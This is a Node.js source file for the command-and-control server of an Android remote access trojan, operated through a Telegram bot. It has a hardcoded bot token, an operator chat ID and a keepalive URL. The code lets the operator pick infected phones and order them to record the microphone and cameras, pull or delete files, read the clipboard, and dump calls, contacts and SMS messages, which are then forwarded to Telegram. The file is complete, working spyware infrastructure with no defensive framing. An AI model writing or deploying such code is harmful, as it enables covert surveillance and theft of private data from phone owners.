const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const PORT = process.env.PORT || 8999;
const token = '7144522875:AAEFGYd8mx8p3wvfpBozxW5Ea5L-XEG2y2M';
const telegramId = '1784606556';
const pingAddress = 'https://rat1-1-lfu0.onrender.com/';

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });
const clients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';

// Utility
function notifyTelegramDeviceEvent(event, data) {
  bot.sendMessage(telegramId, `°• Device ${event}\n\n` +
    `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${data.model}</b>\n` +
    `• ʙᴀᴛᴛᴇʀʏ : <b>${data.battery}</b>\n` +
    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${data.version}</b>\n` +
    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${data.brightness}</b>\n` +
    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${data.provider}</b>`,
    { parse_mode: 'HTML' });
}

// Routes
app.get('/', (req, res) => res.send('<h1 align="center">Alive</h1>'));

app.post("/uploadFile", upload.single('file'), (req, res) => {
  bot.sendDocument(telegramId, req.file.buffer, {
    caption: `Data from <b>${req.headers.model}</b> device`,
    parse_mode: "HTML"
  }, {
    filename: req.file.originalname,
    contentType: 'application/txt'
  });
  res.send('');
});

app.post("/uploadText", (req, res) => {
  console.log('process');
  res.send('');
});

// WebSocket
wss.on('connection', (ws, req) => {
  const uuid = uuid4.v4();
  const headers = req.headers;
  const clientData = {
    model: headers.model,
    battery: headers.battery,
    version: headers.version,
    brightness: headers.brightness,
    provider: headers.provider
  };

  ws.uuid = uuid;
  clients.set(uuid, clientData);
  notifyTelegramDeviceEvent('Connected', clientData);

  ws.on('close', () => {
    notifyTelegramDeviceEvent('Disconnected', clientData);
    clients.delete(uuid);
  });
});

// Telegram Bot
bot.on('message', async (msg) => {
  if (msg.chat.id != telegramId) return bot.sendMessage(msg.chat.id, 'Permission Denied');

  if (msg.reply_to_message) {
    const text = msg.reply_to_message.text;
    const value = msg.text;
    const commands = [
      { key: 'Enter path file to download', prefix: 'file:' },
      { key: 'Enter path file to delete', prefix: 'delete_file:' },
      { key: 'Enter duration microphone', prefix: 'microphone:' },
      { key: 'Enter duration camera main', prefix: 'rec_camera_main:' },
      { key: 'Enter duration camera selfie', prefix: 'rec_camera_selfie:' }
    ];

    for (const cmd of commands) {
      if (text.includes(cmd.key)) {
        wss.clients.forEach(ws => {
          if (ws.uuid === currentUuid) ws.send(cmd.prefix + value);
        });
        currentUuid = '';
        return bot.sendMessage(telegramId, 'Processing...', {
          parse_mode: 'HTML',
          reply_markup: { keyboard: [["Devices"], ["Execute"]], resize_keyboard: true }
        });
      }
    }
  }

  switch (msg.text) {
    case '/start':
      return bot.sendMessage(telegramId, 'Hello!', {
        parse_mode: 'HTML',
        reply_markup: { keyboard: [["Devices"], ["Execute"]], resize_keyboard: true }
      });

    case 'Devices':
      if (!clients.size) return bot.sendMessage(telegramId, 'No Connecting Devices');
      let deviceText = 'List Connected Devices :\n\n';
      clients.forEach((v) => {
        deviceText += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${v.model}</b>\n` +
                      `• ʙᴀᴛᴛᴇʀʏ : <b>${v.battery}</b>\n` +
                      `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${v.version}</b>\n` +
                      `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${v.brightness}</b>\n` +
                      `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${v.provider}</b>\n\n`;
      });
      return bot.sendMessage(telegramId, deviceText, { parse_mode: 'HTML' });

    case 'Execute':
      if (!clients.size) return bot.sendMessage(telegramId, 'No Connecting Devices');
      const inline_keyboard = Array.from(clients.entries()).map(([key, val]) => [{
        text: val.model,
        callback_data: 'device:' + key
      }]);
      return bot.sendMessage(telegramId, 'Select devices to Execute:', {
        reply_markup: { inline_keyboard }
      });
  }
});

const execCommands = [
  'apps', 'device_info', 'file', 'delete_file', 'clipboard',
  'microphone', 'camera_main', 'camera_selfie', 'rec_camera_main',
  'rec_camera_selfie', 'calls', 'contacts', 'messages', 'vibrate'
];

bot.on("callback_query", ({ message, data }) => {
  const [command, uuid] = data.split(':');

  if (command === 'device') {
    const model = clients.get(uuid)?.model || '-';
    return bot.editMessageText(`What Execute ? : <b>${model}</b>`, {
      chat_id: telegramId,
      message_id: message.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Apps', callback_data: `apps:${uuid}` }, { text: 'Device Info', callback_data: `device_info:${uuid}` }],
          [{ text: 'Get File', callback_data: `file:${uuid}` }, { text: 'Delete File', callback_data: `delete_file:${uuid}` }],
          [{ text: 'Clipboard', callback_data: `clipboard:${uuid}` }, { text: 'Microphone', callback_data: `microphone:${uuid}` }],
          [{ text: 'Main Camera', callback_data: `camera_main:${uuid}` }, { text: 'Selfie Camera', callback_data: `camera_selfie:${uuid}` }],
          [{ text: 'Rec Main Camera', callback_data: `rec_camera_main:${uuid}` }, { text: 'Rec Selfie Camera', callback_data: `rec_camera_selfie:${uuid}` }],
          [{ text: 'Calls', callback_data: `calls:${uuid}` }, { text: 'Contacts', callback_data: `contacts:${uuid}` }],
          [{ text: 'Vibrate', callback_data: `vibrate:${uuid}` }, { text: 'Messages', callback_data: `messages:${uuid}` }]
        ]
      },
      parse_mode: 'HTML'
    });
  }

  if (execCommands.includes(command)) {
    if ([ 'file', 'delete_file', 'microphone', 'rec_camera_main', 'rec_camera_selfie' ].includes(command)) {
      currentUuid = uuid;
      const label = command.replace(/_/g, ' ');
      return bot.sendMessage(telegramId, `Enter ${label}\n\nExample: <b>20</b> Seconds`, {
        reply_markup: { force_reply: true },
        parse_mode: 'HTML'
      });
    }
    wss.clients.forEach(ws => ws.uuid === uuid && ws.send(command));
    bot.deleteMessage(telegramId, message.message_id);
    return bot.sendMessage(telegramId, 'Processing...', {
      parse_mode: 'HTML',
      reply_markup: { keyboard: [["Devices"], ["Execute"]], resize_keyboard: true }
    });
  }
});

setInterval(() => {
  wss.clients.forEach(ws => ws.send('ping'));
  axios.get(pingAddress).catch(() => {});
}, 5000);

server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
